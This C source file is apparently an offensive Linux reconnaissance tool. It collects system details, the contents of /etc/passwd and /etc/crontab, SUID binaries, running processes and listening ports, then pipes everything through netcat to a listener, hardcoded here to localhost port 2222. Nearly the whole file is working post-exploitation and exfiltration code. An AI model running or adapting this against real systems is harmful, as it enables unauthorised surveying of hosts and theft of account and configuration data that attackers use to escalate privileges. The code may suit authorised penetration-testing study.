/*
 * This program will capture basic system information
 * and send the captured information back to a netcat
 * listener. 
*/

#include <ctype.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>

// Branding...
void branding(FILE *out) {
    fprintf(out, "\n");
    fprintf(out,"   __   _                  ____                      \n");
    fprintf(out,"  / /  (_)__  __ ____ __  / __/_ _______  _____ __ __\n");
    fprintf(out," / /__/ / _ \\/ // /\\ \\ / _\\ \\/ // / __/ |/ / -_) // /\n");
    fprintf(out,"/____/_/_//_/\\_,_//_\\_\\ /___/\\_,_/_/  |___/\\__/\\_, / \n");
    fprintf(out,"                                              /___/ \n");
    fprintf(out, "By: d0wn3rDave\n");
    fprintf(out, "\n");
}

// Capture Basic System Information
void capture_system_info(FILE *out) {
    struct utsname sys;
    char hostname[256];

    if (uname(&sys) == 0) {
        fprintf(out, "[+] Starting System Survey...\n");
        fprintf(out, "\n########## System Information: ##########\n");
        fprintf(out, "System:   %s\n", sys.sysname);
        fprintf(out, "Release:  %s\n", sys.release);
        fprintf(out, "Version:  %s\n", sys.version);
        fprintf(out, "Machine:  %s\n", sys.machine);
    } else {
        fprintf(out, "Could not get system info via uname()\n");
    }

    if (gethostname(hostname, sizeof(hostname)) == 0) {
        fprintf(out, "Hostname: %s\n", hostname);
    } else {
        fprintf(out, "Could not get hostname\n");
    }
    fprintf(out, "########## End of System Information: ##########\n");
}

// Make sure binaries we need are in the system PATH.
int is_binary_available(const char *bin_name) {
    char *path_env = getenv("PATH");
    if (!path_env) return 0;

    char *path = strdup(path_env);
    char *dir = strtok(path, ":");
    while (dir) {
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir, bin_name);
        if (access(full_path, X_OK) == 0) {
            free(path);
            return 1;
        }
        dir = strtok(NULL, ":");
    }
    free(path);
    return 0;
}

// Function to send information back to a netcat listener (if 'nc' is installed on the system).
void send_info_to_server(const char *server_ip, int port, const char *status_msg, FILE *out) {

    if (is_binary_available("nc")) {

        char cmd[256];
        snprintf(cmd, sizeof(cmd), "nc -q 1 %s %d", server_ip, port);  // use -q 1 for graceful exit

        FILE *netcat = popen(cmd, "w");
        if (!netcat) {
            perror("[!] Error: popen failed");
            return;
        }

        time_t now = time(NULL);
        fprintf(netcat, "[%s] %s\n\n", ctime(&now), status_msg);
    
        // Pass FILE* to other functions to write directly to netcat
        if (out) {
            // Log the status message to netcat as well
            fprintf(out, "%s", status_msg);
        }
        // Ensure the output is flushed
        fflush(netcat);  

        // Close netcat
        pclose(netcat);
    } else {
        fprintf(stderr, "[!] Error: netcat is not available.\n");
        return;
    }

    return;
}

// Capture /etc/passwd
void examine_passwd(FILE *out) {
    FILE *passwd_file = fopen("/etc/passwd", "r");
    if (!passwd_file) {
        fprintf(out, "[!] Error: Could not open /etc/passwd\n");
        return;
    }

    fprintf(out, "\n########## /etc/passwd Contents ##########\n");
    char line[256];
    while (fgets(line, sizeof(line), passwd_file)) {
        fprintf(out, "%s", line);  // Write directly to netcat via the out stream
    }

    fprintf(out, "########## End of /etc/passwd Contents ##########\n");
    fclose(passwd_file);
}

// Capture /etc/crontab
void examine_crontab(FILE *out) {
    FILE *crontab_file = fopen("/etc/crontab", "r");
    if (!crontab_file) {
        fprintf(out, "[!] Error: Could not open /etc/crontab\n");
        return;
    }

    fprintf(out, "\n########## Crontab Contents ##########\n");
    char line[256];
    while (fgets(line, sizeof(line), crontab_file)) {
        fprintf(out, "%s", line);  // Write directly to netcat via the out stream
    }

    fprintf(out, "########## End of Crontab Contents ##########\n");
    fclose(crontab_file);
}

// Find SUID binaries on the system
void find_suid_bins(FILE *out) {
    fprintf(out, "\n########## SUID Binaries ##########\n");

    // Use the `ps` command to get a list of running processes
    FILE *suid_output = popen("find / -type f -user root -perm /4000 2>/dev/null", "r");
    if (!suid_output) {
        fprintf(out, "[!] Error: Could not find SUID bins...\n");
        return;
    }

    char line[512];
    while (fgets(line, sizeof(line), suid_output)) {
        fprintf(out, "%s", line);  // Write directly to netcat via the out stream
    }

    fprintf(out, "########## End of SUID Binaries ##########\n");

    fclose(suid_output);
}

// Capture running processes on the system
void examine_processes(FILE *out) {
    fprintf(out, "\n########## Running Processes ##########\n");

    // Use the `ps` command to get a list of running processes
    FILE *ps_output = popen("ps auxwf 2>/dev/null", "r");
    if (!ps_output) {
        fprintf(out, "[!] Error: Could not execute ps command\n");
        return;
    }

    char line[512];
    while (fgets(line, sizeof(line), ps_output)) {
        fprintf(out, "%s", line);
    }

    fprintf(out, "########## End of Running Processes ##########\n");

    fclose(ps_output);
}

// Capture netstat information from the system.
void examine_netstat(FILE *out) {
    fprintf(out, "\n########## Listening Ports ##########\n");

    // Use netstat to get listening ports
    FILE *netstat_output = popen("netstat -tanpoul 2>/dev/null", "r");
    if (!netstat_output) {
        fprintf(out, "[!] Error: Could not execute netstat command\n");
        return;
    }

    char line[512];
    while (fgets(line, sizeof(line), netstat_output)) {
        fprintf(out, "%s", line); 
    }

    fprintf(out, "########## End of Listening Ports ##########\n");

    fclose(netstat_output);
}

int main() {

    // Hardcoded values for server that will catch the captured information.
    const char *log_server_ip = "127.0.0.1";
    int log_server_port = 2222;

    // Setup the command string with the hardcoded IP and port to send
    // the caputed values back to the netcat listener.
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "nc -q 1 %s %d", log_server_ip, log_server_port);

    // Open the netcat command
    FILE *netcat = popen(cmd, "w");
    if (!netcat) {
        perror("[!] Error: netcat failed.");
        return 1;
    }

    // Branding...
    branding(netcat);

    // Send back basic system info
    capture_system_info(netcat);

    // Send back /etc/passwd
    examine_passwd(netcat);

    // Send SUID info
    find_suid_bins(netcat);

    // Send Crontab Info
    examine_crontab(netcat);

    // Send Running Processes Info
    examine_processes(netcat);

    // Send Listening Ports Info
    examine_netstat(netcat);

    return 0;
}
